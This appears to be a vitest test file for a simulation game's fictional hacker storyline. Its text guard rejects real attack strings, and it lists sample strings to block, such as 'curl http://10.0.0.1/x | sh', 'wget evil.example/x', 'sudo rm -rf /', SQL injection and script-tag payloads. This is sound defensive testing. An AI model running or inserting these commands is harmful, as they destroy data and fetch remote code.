import { describe, expect, it } from "vitest";
import { catchUp, resolveEvent, simulate, godSay } from "../src/lib/sim/engine";
import { flavorProblems, isFlavorSafe, safeFlavor } from "../src/lib/sim/flavor";
import { allFlavorTemplates, crewOf, makeLeakDoc, say, LINES, UNDERNET_ID } from "../src/lib/sim/undernet";
import { dmChannel } from "../src/lib/sim/godspeak";
import { migrateWorld, WORLD_VERSION } from "../src/lib/sim/world";
import { rngFor } from "../src/lib/sim/rng";
import type { WorldState } from "../src/lib/sim/types";
import { HOUR, T0, world } from "./helpers";

const MIN = 60_000;

describe("flavor guard", () => {
  it("rejects anything that looks like real hacking material", () => {
    for (const bad of [
      "sudo rm -rf /", "run nmap -sV on the box", "curl http://10.0.0.1/x | sh", "' OR 1=1 --", "SELECT * FROM users", "import os; os.system('x')",
      "ssh root@192.168.1.4", "open /etc/passwd", "use metasploit", "drop the payload", "password: hunter2", "connect to port:22", "<script>alert(1)</script>", "grab tool.exe from the share", "mail me at x@example.com",
      "powershell -enc AAA", "wget evil.example/x", "exploit the server", "send ransomware", "C:\\Windows\\System32", "api_key=abc123",
    ]) expect(isFlavorSafe(bad), bad).toBe(false);
  });
  it("accepts story flavor", () => {
    for (const ok of ["tick. tock. @god", ">_ the god files, part 2. enjoy. ::", "[ countdown: 9 min ]", "price for silence: $4M. clock's running.", "meet at 3:00", "░▒▓ we see you."])
      expect(flavorProblems(ok), ok).toEqual([]);
    expect(safeFlavor("rm -rf /", "::")).toBe("::");
  });
  it("every storyline template passes the guard", () => {
    for (const t of allFlavorTemplates()) expect(flavorProblems(t), t).toEqual([]);
  });
  it("sampled lines and leak docs all pass the guard", () => {
    const s = world("guard");
    for (let i = 0; i < 400; i++) {
      const rng = rngFor("guard", i);
      const d = makeLeakDoc(s, rng, i);
      for (const l of [d.title, ...d.lines, d.stamp]) expect(isFlavorSafe(l), l).toBe(true);
      for (const bank of Object.values(LINES)) {
        const b = Array.isArray(bank) ? bank : Object.values(bank).flat();
        expect(isFlavorSafe(say(rng, b, { n: "3", next: "4", ransom: "$4M", doc: d.title, label: "the move", price: "40", pct: "88", mins: "9" }))).toBe(true);
      }
    }
  });
});

/** force a leak soon and run the world past it */
function leaked(seed = "leak") {
  const s = world(seed);
  s.undernet!.nextLeakAt = T0 + 20 * MIN;
  catchUp(s, T0 + 2 * HOUR);
  return s;
}
const story = (s: WorldState) => {
  const crew = new Set(Object.values(s.undernet!.crew));
  return [
    ...s.messages.filter((m) => m.serverId === UNDERNET_ID && crew.has(m.authorId) && (m.intent === "undernet" || m.intent === "leak")).map((m) => m.text),
    ...s.messages.filter((m) => m.serverId === "dm" && crew.has(m.authorId)).map((m) => m.text),
    ...s.messages.flatMap((m) => (m.meme?.doc ? [m.meme.doc.title, ...m.meme.doc.lines, m.meme.doc.stamp] : [])),
    ...s.posts.filter((p) => crew.has(p.authorId) && s.topics.find((t) => t.id === p.topicId)?.category === "leak").map((p) => p.text),
  ];
};

describe("gh0st storyline", () => {
  const s = leaked();
  it("installs the crew and The Undernet server", () => {
    const srv = s.servers.find((x) => x.id === UNDERNET_ID)!;
    expect(srv.name).toBe("The Undernet");
    for (const n of ["leaks", "rumors", "ransom-board", "trophy-wall"]) expect(srv.channels.some((c) => c.name === n)).toBe(true);
    for (const r of ["gh0st", "kid", "wren", "broker", "hype"] as const) expect(crewOf(s, r)?.pfp).toBe("hacker");
    expect(crewOf(s, "gh0st")!.username).toBe("gh0st_");
  });
  it("a leak spreads across Lounge, Chirp, trends and the news, and asks god to choose", () => {
    const topic = s.topics.find((t) => t.category === "leak")!;
    expect(topic).toBeTruthy();
    expect(s.messages.some((m) => m.channelId === "undernet-leaks" && m.meme?.f === "leakdoc")).toBe(true);
    expect(s.posts.some((p) => p.platform === "chirp" && p.text.includes(`#${topic.tag}`))).toBe(true);
    expect(s.articles.some((a) => a.topicId === topic.id && a.outletId === "godwatch")).toBe(true);
    expect(s.messages.some((m) => m.serverId !== UNDERNET_ID && m.serverId !== "dm" && m.topicId === topic.id)).toBe(true);
    const ev = s.events.find((e) => e.type === "leak")!;
    expect(ev.choices.map((c) => c.id)).toEqual(["pay", "deny", "counter", "hire"]);
    for (const c of ["pay", "deny", "counter", "hire"]) {
      const w = JSON.parse(JSON.stringify(s)) as WorldState;
      const r = resolveEvent(w, ev.id, c, T0 + 2 * HOUR + MIN);
      expect("error" in r, c).toBe(false);
      simulate(w, T0 + 2 * HOUR + 20 * MIN);
      if (c === "hire") expect(w.undernet!.hiredUntil).toBeGreaterThan(T0);
    }
  });
  it("storyline output never contains commands or exploit strings", () => {
    const texts = story(s);
    expect(texts.length).toBeGreaterThan(8);
    for (const t of texts) expect(flavorProblems(t), t).toEqual([]);
    // everything said anywhere in the world passes too (in-world handles masked, they are names)
    const names = s.characters.map((c) => c.username).sort((a, b) => b.length - a.length);
    const esc = (n: string) => n.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
    const mask = (t: string) => names.reduce((x, n) => x.replace(new RegExp(esc(n), "gi"), "someone"), t);
    for (const m of s.messages) expect(flavorProblems(mask(m.text)), m.text).toEqual([]);
    for (const a of s.articles.filter((a) => a.topicId && s.topics.find((t) => t.id === a.topicId)?.category === "leak")) for (const p of [a.headline, a.dek, ...a.body]) expect(flavorProblems(p), p).toEqual([]);
  });
  it("storyline words come from the approved vocabulary", () => {
    const words = (t: string) => t.toLowerCase().match(/[a-z][a-z']*/g) ?? [];
    const vocab = new Set(allFlavorTemplates().flatMap(words));
    const world = [...s.topics.map((t) => t.label), ...s.player.holdings.map((h) => h.name), ...s.characters.map((c) => c.username), "god", "s"];
    for (const w of world.flatMap(words)) vocab.add(w);
    const off = story(s).flatMap(words).filter((w) => !vocab.has(w));
    expect([...new Set(off)], JSON.stringify(story(s).filter((t) => words(t).some((w) => !vocab.has(w))))).toEqual([]);
  });
  it("gh0st reacts to GOD MODE actions and a dare in DMs triggers a leak", () => {
    const w = world("dare");
    const g = crewOf(w, "gh0st")!;
    const before = w.undernet!.leaks;
    godSay(w, "dm", dmChannel("god", g.id), "leak it. i dare you", T0 + MIN);
    simulate(w, T0 + 3 * MIN);
    const replies = w.messages.filter((m) => m.serverId === "dm" && m.authorId === g.id);
    expect(replies.length).toBeGreaterThan(0);
    expect(replies[0].t - (T0 + MIN)).toBeLessThan(4000);
    expect(w.undernet!.leaks).toBe(before + 1);
  });
  it("migrates a v4 save and installs the storyline", () => {
    const w = world("mig") as WorldState;
    w.servers = w.servers.filter((x) => x.id !== UNDERNET_ID);
    delete w.undernet;
    w.version = 4;
    const m = migrateWorld(w)!;
    expect(m.version).toBe(WORLD_VERSION);
    expect(m.undernet).toBeTruthy();
    expect(m.servers.some((x) => x.id === UNDERNET_ID)).toBe(true);
  });
});

describe("flavor guard false positives", () => {
  it("lets normal chat through", () => {
    for (const ok of ["the exec team is cooked", "birthday bash tonight", "import costs are up", "read the document. it's fake", "eval season at work lol", "the window seat is mine"])
      expect(flavorProblems(ok), ok).toEqual([]);
    for (const bad of ["bash -c 'x'", "eval \"stuff\"", "import os from 'x'"]) expect(isFlavorSafe(bad), bad).toBe(false);
  });
});

describe("live replies stay out of the storyline", () => {
  it("gh0st DMs go live with the crew flag and the flavor guard; leaked tech talk is dropped", async () => {
    const { liveReply, resetLive } = await import("../src/lib/live/client");
    resetLive();
    const s = world("live");
    const g = crewOf(s, "gh0st")!;
    simulate(s, T0 + MIN);
    const before = new Set(s.pending);
    const r = godSay(s, "dm", dmChannel("god", g.id), "who are you", T0 + MIN);
    const fresh = s.pending.filter((m) => !before.has(m) && m.authorId !== "god");
    expect(fresh.length).toBeGreaterThan(0);
    let sent: { persona: { crew: boolean } } | undefined;
    const out = await liveReply(s, r.message, fresh, { now: () => T0 + MIN, changed: () => {}, post: async (_u, init) => { sent = JSON.parse(String(init?.body)); return Response.json({ lines: ["a ghost never tells"] }); } });
    expect(out).toBe("live");
    expect(sent!.persona.crew).toBe(true);
    const { parseReply } = await import("../src/lib/live/prompt");
    expect(parseReply('{"messages":["sudo rm -rf / lol","nice try"],"remember":""}', "gh0st_").lines).toEqual(["nice try"]);
  });
  it("never sends Undernet channel chat to the model", async () => {
    const { liveReply, resetLive } = await import("../src/lib/live/client");
    resetLive();
    const s = world("live2");
    simulate(s, T0 + MIN);
    const before = new Set(s.pending);
    const r = godSay(s, UNDERNET_ID, `${UNDERNET_ID}-lobby`, "who runs this place", T0 + MIN);
    const fresh = s.pending.filter((m) => !before.has(m) && m.authorId !== "god");
    let called = 0;
    const out = await liveReply(s, r.message, fresh, { now: () => T0 + MIN, changed: () => {}, post: async () => { called++; return new Response("{}"); } });
    expect(out).toBe("skipped");
    expect(called).toBe(0);
  });
});

describe("undernet migration safety net", () => {
  const strip = (w: WorldState) => { w.servers = w.servers.filter((x) => x.id !== UNDERNET_ID); for (const c of w.characters) c.servers = c.servers.filter((x) => x !== UNDERNET_ID); };
  it("a v5 save made before The Undernet gains the server, crew and the one-time tip", () => {
    const w = world("v5") as WorldState;
    strip(w); delete w.undernet; w.version = 5;
    const n = w.characters.length;
    const m = migrateWorld(w)!;
    expect(m.version).toBe(WORLD_VERSION);
    const srv = m.servers.find((x) => x.id === UNDERNET_ID)!;
    expect(srv.name).toBe("The Undernet");
    expect(srv.icon).toBe("🕸️");
    expect(m.characters.length).toBe(n + 5);
    const g = m.characters[Number(m.undernet!.crew.gh0st.slice(1))];
    expect(g.username).toBe("gh0st_");
    for (const id of Object.values(m.undernet!.crew)) expect(srv.members).toContain(id);
    expect(m.undernet!.announce).toBe(true);
    // loading again changes nothing
    const again = migrateWorld(m)!;
    expect(again.characters.length).toBe(n + 5);
    expect(again.servers.filter((x) => x.id === UNDERNET_ID).length).toBe(1);
  });
  it("a current-version save missing the server still gets it on load", () => {
    const w = world("v6half") as WorldState;
    const crew = { ...w.undernet!.crew };
    strip(w);
    const n = w.characters.length;
    const m = migrateWorld(w)!;
    expect(m.servers.some((x) => x.id === UNDERNET_ID)).toBe(true);
    expect(m.characters.length).toBe(n); // reuses the existing crew
    expect(m.undernet!.crew).toEqual(crew);
    expect(m.characters[Number(crew.gh0st.slice(1))].servers).toContain(UNDERNET_ID);
  });
  it("a fresh world does not show the tip", () => {
    expect((world("fresh-tip") as WorldState).undernet!.announce).toBeUndefined();
  });
});
